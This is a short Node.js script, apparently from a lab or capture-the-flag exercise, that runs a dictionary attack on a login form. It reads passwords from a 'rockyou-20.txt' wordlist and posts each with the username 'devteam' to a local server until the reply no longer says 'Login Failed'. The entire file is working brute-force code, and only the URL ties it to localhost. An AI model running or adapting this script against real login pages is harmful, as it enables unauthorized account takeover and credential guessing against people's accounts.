const fs = require('fs')
const axios = require ('axios')
const qs = require('qs')

findValidPassword()

async function findValidPassword(){
    for(const password of readPossiblePasswords()){
        const passwordValidity = await checkPasswordValidaty(password)
        console.log(`checking password: ${password}`)
        if(passwordValidity.isValidPassword){
            console.log("found valid password")
            console.log(`password:${passwordValidity.password}`)
            break
        }
    }
}


function readPossiblePasswords() {
    const data = fs.readFileSync("rockyou-20.txt", 'utf-8')
    const lines = data.split(/\r?\n/)
    return lines
};


async function checkPasswordValidaty(password){
    const data = { username: "devteam", password : password}
    
    const options = {
        headers: { 'content-type': 'application/x-www-form-urlencoded' }
      }
    const response = await axios.post(
        "http://localhost:3000", qs.stringify(data),
        options)
    
    
    const isValidPassword = !response.data.includes('Login Failed')
    return {password: password, isValidPassword}
    
}




